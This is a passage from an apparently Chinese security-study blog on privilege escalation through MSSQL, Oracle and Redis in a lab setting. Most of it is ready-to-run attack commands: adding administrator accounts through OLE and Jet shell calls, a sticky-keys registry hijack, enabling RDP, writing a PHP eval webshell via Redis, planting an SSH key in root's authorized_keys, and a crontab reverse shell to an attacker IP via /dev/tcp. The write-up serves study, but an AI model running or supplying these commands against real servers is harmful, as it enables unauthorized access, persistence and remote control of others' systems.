<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>首先还是查看sp_oacreate组件是否启用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>;<br></code></pre></td></tr></table></figure>



<p>打开组件</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><code class="hljs delphi">EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;       <br>RECONFIGURE <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">OVERRIDE</span>;  <br>EXEC sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;  <br>RECONFIGURE <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">OVERRIDE</span>;  <br></code></pre></td></tr></table></figure>



<p>因为使用sp_oacreate组件执行命令时，是没有回显的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod<br><span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br><br>#把结果保存到了	c:\\<span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure>

<p>把结果保存到文档里面，就可以读取了</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113152811330.png"  ><span class="image-caption">image-20230113152811330</span></p>
<p>没有任何回显</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113152916704.png"  ><span class="image-caption">image-20230113152916704</span></p>
<p>具有system权限</p>
<p>提权成功</p>
<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>思路方法大致和xp_cmdshell差不多，就是调用sp_oacreate组件来执行命令</p>
<p>但是没有回显，不方便</p>
<p>还是优先使用xp_cmdshell来实现</p>
<h2 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>沙盒模式是数据库的一种安装机制</p>
<p>开启沙盒模式时，只对控件和字段属性中的安全且不含恶意代码，才能执行</p>
<p>简而言之，就是不能执行恶意代码</p>
<h3 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h3><p>首先得知道，控制沙盒模式的参数    SandBoxMode</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">`0`：在任何所有者中禁止启用安全模式<br>`1`：为仅在允许范围内<br>`2`：必须在access模式下<br>`3`：完全开启<br></code></pre></td></tr></table></figure>

<p>我们需要做的就是关闭沙盒模式，然后执行代码</p>
<p>用xp_regwrite这个存储这个存储过程对注册表进行写操作，关闭沙盒模式</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">EXEC master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_regwrite</span> <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SoftWare\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>



<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113161625252.png"  ><span class="image-caption">image-20230113161625252</span></p>
<p>如果执行失败，应该是没有<font color='red'>打开允许修改高级参数</font>，打开后应该时可以关闭沙盒模式的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,1;reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,1;reconfigure;<br></code></pre></td></tr></table></figure>



<p>查询是否关闭沙盒模式，但是经过测试发现，无论是否关闭，好像都是不影响我们执行语句的</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">exec master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_regread</span> <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<br><span class="hljs-string">&#x27;SandBoxMode&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113161656995.png"  ><span class="image-caption">image-20230113161656995</span></p>
<p>关闭成功</p>
<p>添加管理员用户</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> * from<br>openrowset(<span class="hljs-symbol">&#x27;microsoft.jet.oledb.4.0</span><span class="hljs-string">&#x27;,&#x27;</span>;database=c:/windows/system32/ias/ias.mdb<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">select</span> shell(<span class="hljs-string">&quot;net user margin margin /add&quot;</span>)&#x27;)<br><br><span class="hljs-keyword">select</span> * from<br>openrowset(<span class="hljs-symbol">&#x27;microsoft.jet.oledb.4.0</span><span class="hljs-string">&#x27;,&#x27;</span>;database=c:/windows/system32/ias/ias.mdb<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">select</span> shell(<span class="hljs-string">&quot;net localgroup administrators margin /add&quot;</span>)&#x27;)<br></code></pre></td></tr></table></figure>

<p>然后就成功了</p>
<h3 id="痕迹清理-1"><a href="#痕迹清理-1" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#删除用户</span><br><span class="hljs-keyword">select</span> * from<br>openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net user margin margin /del&quot;)&#x27;</span>)<br><br><span class="hljs-comment">#打开沙盒</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br><br><span class="hljs-comment">#关闭高级设置修改</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;<br>reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">0</span>;<br>reconfigure;<br></code></pre></td></tr></table></figure>



<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>沙盒提权，其实就是，关闭沙盒模式，来执行敏感语句</p>
<h2 id="JOB提权"><a href="#JOB提权" class="headerlink" title="JOB提权"></a>JOB提权</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>通过创建应该任务，来执行命令</p>
<h3 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h3><p>首先开启sqlagent服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master.dbo.xp_servicecontrol <span class="hljs-string">&#x27;start&#x27;</span>,<span class="hljs-string">&#x27;SQLSERVERAGENT&#x27;</span>;<br></code></pre></td></tr></table></figure>



<p>然后添加任务</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> msdb<br><br><span class="hljs-keyword">exec</span> sp_delete_job null,<span class="hljs-string">&#x27;x&#x27;</span><br><br><span class="hljs-keyword">exec</span> sp_add_job <span class="hljs-string">&#x27;x&#x27;</span><br></code></pre></td></tr></table></figure>



<p>通过任务来执行命令，将结果保存在    c:/1.txt</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> sp_add_jobstep <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;cmdexec&#x27;</span>,<span class="hljs-string">&#x27;cmd /c &quot;ipconfig&gt;c:/1.txt&quot;&#x27;</span><br><br><span class="hljs-keyword">exec</span> sp_add_jobserver <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;x&#x27;</span>,@<span class="hljs-variable">@servername</span><br><br><span class="hljs-keyword">exec</span> sp_start_job <span class="hljs-string">&#x27;x&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113165411396.png"  ><span class="image-caption">image-20230113165411396</span></p>
<p>任务启动成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113165441060.png"  ><span class="image-caption">image-20230113165441060</span></p>
<p>命令执行成功</p>
<h2 id="镜像劫持提权"><a href="#镜像劫持提权" class="headerlink" title="镜像劫持提权"></a>镜像劫持提权</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>通过使用<font color='cornflowerblue'><strong>xp_regwrite</strong></font>存储过程对注册表进行修改，替换成任意值，造成镜像劫持</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>首先需要数据库<font color='red'>对注册表有写权限</font></p>
<p>其次就是xp_regwrite组件启用</p>
<h3 id="操作-4"><a href="#操作-4" class="headerlink" title="操作"></a>操作</h3><p>首先就是查看，<font color='red'>xp_regwrite是否开启</font></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype=<span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;xp_regwrite&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172155099.png"  ><span class="image-caption">image-20230113172155099</span></p>
<p>发现已经开启</p>
<p><font color='red'>开启xp_regwrite</font></p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_regwrite&#x27;</span>,<span class="hljs-number">1</span><br>RECONFIGURE<br></code></pre></td></tr></table></figure>



<p>然后就可以<font color='red'>劫持注册表</font>来执行命令了，以连按5次粘滞键，弹出cmd框为例子</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">EXEC</span> master..xp_regwrite <span class="hljs-variable">@rootkey</span>=<span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-variable">@key</span>=<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;</span>,<span class="hljs-variable">@value_name</span>=<span class="hljs-string">&#x27;Debugger&#x27;</span>,<span class="hljs-variable">@type</span>=<span class="hljs-string">&#x27;REG_SZ&#x27;</span>,<span class="hljs-variable">@value</span>=<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe&#x27;</span><br></code></pre></td></tr></table></figure>



<p>查看是否成功</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">exec</span></span> master..xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;</span>,<span class="hljs-string">&#x27;Debugger&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172319349.png"  ><span class="image-caption">image-20230113172319349</span></p>
<p>对应值正确</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172406442.png"  ><span class="image-caption">image-20230113172406442</span></p>
<p>成功</p>
<p>删除连按5次粘滞键，弹出cmd框</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">xp_regdeletekey</span> <span class="hljs-operator">&#x27;</span><span class="hljs-type">HKEY_LOCAL</span><span class="hljs-type">_MACHINE</span><span class="hljs-operator">&#x27;,</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">SOFTWARE</span>\<span class="hljs-variable">Microsoft</span>\<span class="hljs-variable">Windows</span> <span class="hljs-variable">NT</span>\<span class="hljs-variable">CurrentVersion</span>\<span class="hljs-built_in">Image</span> <span class="hljs-built_in">File</span> <span class="hljs-variable">Execution</span> <span class="hljs-built_in">Options</span>\<span class="hljs-variable">sethc</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><span class="hljs-operator">&#x27;</span><br></code></pre></td></tr></table></figure>



<p>开启3389端口</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">exec master.dbo.xp_regwrit<span class="hljs-string">e&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br><br>exec master..xp_cmdshell &quot;REG ADD &#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#x27; /v fDenyTSConnections /t REG_DWORD /d 0&quot;<br><br>#一定要打开xp_cmdshell<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113172939766.png"  ><span class="image-caption">image-20230113172939766</span></p>
<p>成功</p>
<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>镜像劫持的本质，其实就是通过xp_regwrite组件来修改注册表，从而开启一些设置</p>
<h2 id="MSSQL提权总结"><a href="#MSSQL提权总结" class="headerlink" title="MSSQL提权总结"></a>MSSQL提权总结</h2><p>提权手段，大多都是通过mssql数据库的组件，基于mssql数据库本身具有的高权限，从而达到高权限执行命令</p>
<p>比较好用的是，<font color='red'><strong>沙盒提权</strong></font>，<font color='red'><strong>JOB提权</strong></font></p>
<p>其他的提权手段，是会被360等劫持的</p>
<h1 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>oracle数据库是比较特殊的数据库</p>
<p>它是和jsp进行搭建，jsp脚本的特性，导致不需要提权，生成后门，就是system权限</p>
<p>它有三种提权模式</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">普通用户模式<br><br>dba用户模式<br><br>注入模式<br></code></pre></td></tr></table></figure>



<h2 id="操作-5"><a href="#操作-5" class="headerlink" title="操作"></a>操作</h2><p>直接使用工具就行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">[oracle提权执行命令工具oracleShell v0.<span class="hljs-number">1</span>]<br><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jas502n/</span>oracleShell<br></code></pre></td></tr></table></figure>







<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>redis数据库，是一个开源的数据库</p>
<p>使用ANSI C语言编写</p>
<p>提供多种语言的API</p>
<h2 id="搭建redis数据库"><a href="#搭建redis数据库" class="headerlink" title="搭建redis数据库"></a>搭建redis数据库</h2><h3 id="安装redis数据库"><a href="#安装redis数据库" class="headerlink" title="安装redis数据库"></a>安装redis数据库</h3><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">tar</span> xzf redis-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure>



<h3 id="设置远程访问"><a href="#设置远程访问" class="headerlink" title="设置远程访问"></a>设置远程访问</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vim</span> redis.conf<br><br>bind <span class="hljs-number">127.0.0.1</span>前面加上<span class="hljs-comment">#号 或者设置为 0.0.0.0 支持其他ip地址访问</span><br><br>保护模式：protected-mode改为<span class="hljs-literal">no</span>，否则无法远程连接<br><br>设置后台运行：daemonize <span class="hljs-literal">yes</span><br><br>密码：修改requirepass xxxxx（你的密码）<br></code></pre></td></tr></table></figure>





<h3 id="端口发放"><a href="#端口发放" class="headerlink" title="端口发放"></a>端口发放</h3><p>首先需要去服务器开放6379端口</p>
<p>还需在本地设置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">firewall-cmd <span class="hljs-attribute">--query-port</span>=6379/tcp<br>如果返回结果为<span class="hljs-literal">no</span>，那么证明6379端口确实没有开启。<br><br><br>输入<br>firewall-cmd <span class="hljs-attribute">--add-port</span>=6379/tcp<br>将6379端口开启，返回success<br><br><br>再次查询端口是否开放<br>firewall-cmd <span class="hljs-attribute">--query-port</span>=6379/tcp<br>返回结果为<span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure>



<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/src/</span>redis-server  redis.conf<br></code></pre></td></tr></table></figure>





<h3 id="redis数据库基本命令"><a href="#redis数据库基本命令" class="headerlink" title="redis数据库基本命令"></a>redis数据库基本命令</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog">连接数据库<br>redis-cli -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">63</span>.<span class="hljs-number">130</span><br><br><br>查看一些具体信息<br><span class="hljs-number">192.168.63.130:6379</span>&gt;info<br><br><br>将变量x设置为text<br><span class="hljs-number">192.168.63.130:6379</span>&gt;set x <span class="hljs-string">&quot;test&quot;</span><br><br><br>查看所有键<br><span class="hljs-number">192.168.63.130:6379</span>&gt;KEYS *<br><br><br>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复<br><span class="hljs-number">192.168.63.130:6379</span>&gt;CONFIG GET dir<br><span class="hljs-number">192.168.63.130:6379</span>&gt;CONFIG GET dbfilename<br><br><br>删除整个数据库<br><span class="hljs-number">192.168.63.130:6379</span>&gt;flushall<br><br><br>启动Redis服务可以执行：<br>service redisd start<br> <br> <br>关闭服务<br>service redisd stop<br> <br> <br>重启服务<br>service redisd restart<br> <br> <br>在控制台进入redis客户端<br>redis-cli<br> <br><br></code></pre></td></tr></table></figure>

<p>尝试远程连接</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114153932963.png"  ><span class="image-caption">image-20230114153932963</span></p>
<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>如果redis数据库配置不当，就会导致未授权访问漏洞</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">redis</span>数据库允许任意<span class="hljs-built_in">ip</span>访问，并且没有进行添加防火墙规则避免其他非信任来源<span class="hljs-built_in">ip</span>访问等相关安全策略<br></code></pre></td></tr></table></figure>

<p>否则就无法连接</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">没有设置密码认证（默认为空），可以免密码远程登录数据库<br></code></pre></td></tr></table></figure>

<p>如果设置了密码，是可以连接的，但是无法执行命令</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114161310186.png"  ><span class="image-caption">image-20230114161310186</span></p>
<p>这里连接成功，但是执行操作，需要密码认证</p>
<h2 id="写入webshell提权"><a href="#写入webshell提权" class="headerlink" title="写入webshell提权"></a>写入webshell提权</h2><p>首先连接</p>
<p>然后在目录里面创建文件，写入webshell</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html/                #一般网站目录</span><br><span class="language-xml"></span><br><span class="language-xml">config set dbfilename shell.php               #创建shell文件</span><br><span class="language-xml"></span><br><span class="language-xml">set x &quot;\r\n\r\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;     #redis写入文件的会自带一些版本信息，\r\n\r\n是换行的意思</span><br><span class="language-xml"></span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114163230964.png"  ><span class="image-caption">image-20230114163230964</span></p>
<p>去服务器查看</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114163300780.png"  ><span class="image-caption">image-20230114163300780</span></p>
<p>创建成功</p>
<p>此时就可以用蚁剑连接了</p>
<h2 id="SSH登录提权"><a href="#SSH登录提权" class="headerlink" title="SSH登录提权"></a>SSH登录提权</h2><h3 id="提权条件-1"><a href="#提权条件-1" class="headerlink" title="提权条件"></a>提权条件</h3><figure class="highlight xquery"><table><tr><td class="code"><pre><code class="hljs xquery">在主机<span class="hljs-built_in">是root</span>用户的条件下，启动的redis数据库<br></code></pre></td></tr></table></figure>



<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器<br><br>服务端存在<span class="hljs-string">.ssh</span>目录并且有写入的权限<br></code></pre></td></tr></table></figure>





<h3 id="操作-6"><a href="#操作-6" class="headerlink" title="操作"></a>操作</h3><p>本地生成公钥</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114180000255.png"  ><span class="image-caption">image-20230114180000255</span></p>
<p>进入.ssh目录，保存密钥到key.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/.ssh<br><br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>;<span class="hljs-built_in">cat</span> id_rsa.pub;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>)&gt;key.txt<br></code></pre></td></tr></table></figure>



<p>将保存的公钥写入数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.ssh/key.txt | redis-cli -h 靶机ip地址 -x <span class="hljs-built_in">set</span> pub        <span class="hljs-comment">#命名为pub</span><br></code></pre></td></tr></table></figure>



<p>查看是否写入成功</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> pub<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114180847597.png"  ><span class="image-caption">image-20230114180847597</span></p>
<p>设置路径、文件名</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">config <span class="hljs-built_in">set</span> dir  /root/.ssh<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys <br><br>save<br></code></pre></td></tr></table></figure>



<p>然后就可以ssh远程连接了</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">ssh ip地址<br><br>或者<br><br>ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@ip</span>地址<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230114202521056.png"  ><span class="image-caption">image-20230114202521056</span></p>
<p>成功</p>
<p>这最后一步ssh连接我卡了半天</p>
<p>首先我们要知道的是    PermitRootLogin    这个参数</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">PermitRootLogin如果不设置，默认是yes,也就是root可以登录<br><br>如果设置<span class="hljs-keyword">without</span>-<span class="hljs-keyword">password</span> 那么root可以登录，但是不允许通过密码ssh登陆<br>如果设置<span class="hljs-keyword">no</span>, root不许登陆<br>如果设置forced-commands-<span class="hljs-keyword">only</span>，则可以登录，但是登陆后不能进入交互，而是执行指定的命令后 自动退出<br></code></pre></td></tr></table></figure>

<p>这个参数在<font color='red'>阿里云服务器默认是no</font>，在<font color='red'>腾讯云默认yes</font></p>
<p>该参数位置在</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>ssh/sshd_config<br></code></pre></td></tr></table></figure>



<p>另一个需要注意的点是</p>
<p>我们需要在攻击机的    /root/.ssh    目录下执行命令，否则不会成功</p>
<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>shh登陆提权的要点是</p>
<p>首先就是需要开启ssh连接，对/root/.ssh目录有写权限</p>
<p>还有就是数据库没有设置密码，否则我们是写不进去的</p>
<p>还有就是个人觉得比较重要的就是，在主机是root用户的条件下，启动的redis数据库（电脑用户是root，并不是说redis数据库是root用户）</p>
<p>我们最终获得的权限，就是打开数据库那个用户的权限，如果权限比较低，用这种方法提权，就没有必要</p>
<h2 id="crontab计划任务提权"><a href="#crontab计划任务提权" class="headerlink" title="crontab计划任务提权"></a>crontab计划任务提权</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。</p>
<h3 id="操作-7"><a href="#操作-7" class="headerlink" title="操作"></a>操作</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">redis-cli -h 192.168.244.128 -p 6379<br><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.232.129/1111 0&gt;&amp;1\n\n&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /var/spool/cron/crontabs/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>

<p>然后开启nc监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -nlvp <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>

<p>最后过一会就能收到监听</p>
<p>我是用ubuntu测试的，无法成功，只能用centos</p>
<p>原因</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">因为默认redis写文件后是<span class="hljs-number">644</span>的权限，但ubuntu要求执行定时任务文件<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs<span class="hljs-regexp">/权限必须是600也就是-rw-------才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/</span>var<span class="hljs-regexp">/spool/</span>cron/权限<span class="hljs-number">644</span>也能执行<br><br>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错<br><br>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span><br>Ubuntu定时任务文件在<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs/<br></code></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>端口转发与内网代理</title>
